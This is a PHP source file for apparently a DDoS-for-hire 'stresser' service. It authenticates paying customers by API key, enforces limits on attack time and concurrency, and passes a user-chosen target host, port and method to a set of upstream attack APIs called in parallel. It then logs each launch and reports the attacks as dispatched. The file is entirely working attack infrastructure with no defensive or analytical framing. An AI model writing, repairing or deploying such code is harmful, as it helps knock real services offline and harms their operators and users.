<?php
include 'config.php';
header('Content-Type: application/json');

if(!isset($_GET['action']) || $_GET['action']!=='startAttack'){
    http_response_code(400);
    exit(json_encode(['message'=>'Invalid action.']));
}

$in = json_decode(file_get_contents('php://input'), true);
$host = trim($in['host'] ?? '');
$port = intval($in['port'] ?? 0);
$time = intval($in['time'] ?? 0);
$method = trim($in['method'] ?? '');
$key = trim($in['key'] ?? '');
$concs = intval($in['concurrents'] ?? 0);
$remoteIp = $_SERVER['REMOTE_ADDR'];

if(!$host||!$port||!$time||!$method||!$key||!$concs){
    exit(json_encode(['message'=>'Missing parameters.']));
}

$pdo = dbConnect();
$stmt = $pdo->prepare("SELECT * FROM users WHERE api_key = ?");
$stmt->execute([$key]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
if(!$user){
    exit(json_encode(['message'=>'Invalid API key.']));
}

if($user['ip_address'] !== null){
    $allowed = array_map('trim', explode(',', $user['ip_address']));
    if(!in_array($remoteIp, $allowed)){
        http_response_code(403);
        exit(json_encode(['message'=>"Access denied from IP {$remoteIp}."]));
    }
}

if(new DateTime() > new DateTime($user['expiry'])){
    exit(json_encode(['message'=>'API key expired.']));
}

if($time > $user['maxtime']){
    exit(json_encode(['message'=>"Max time is {$user['maxtime']}s."]));
}
if($concs > $user['concurrents']){
    exit(json_encode(['message'=>"Max concurrents is {$user['concurrents']}."]));
}

$stmt = $pdo->prepare("SELECT 1 FROM blacklist WHERE host = ?");
$stmt->execute([$host]);
if($stmt->fetch()){
    exit(json_encode(['message'=>'Target is blacklisted.']));
}

$stmt = $pdo->query("SELECT apiurl FROM apis");
$urls = [];
while($row = $stmt->fetch(PDO::FETCH_ASSOC)){
    $urls[] = str_replace(
        ['{host}','{port}','{time}','{method}'],
        [$host,$port,$time,$method],
        $row['apiurl']
    );
}

$mh = curl_multi_init();
$handles = [];
foreach($urls as $url){
    for($i=0;$i<$concs;$i++){
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_multi_add_handle($mh, $ch);
        $handles[] = ['ch'=>$ch];
    }
}
$running = null;
do {
    curl_multi_exec($mh, $running);
    curl_multi_select($mh);
} while($running);

foreach($handles as $h){
    $ch   = $h['ch'];
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $status = ($code>=200 && $code<300)?'success':'fail';

    $log = $pdo->prepare("
      INSERT INTO logs
        (user_id,host,port,time,method,concurrents,status)
      VALUES (?,?,?,?,?,?,?)
    ");
    $log->execute([
        $user['id'],$host,$port,$time,
        $method,$concs,$status
    ]);

    curl_multi_remove_handle($mh, $ch);
    curl_close($ch);
}
curl_multi_close($mh);

echo json_encode(['message'=>'Attack(s) dispatched successfully.']);
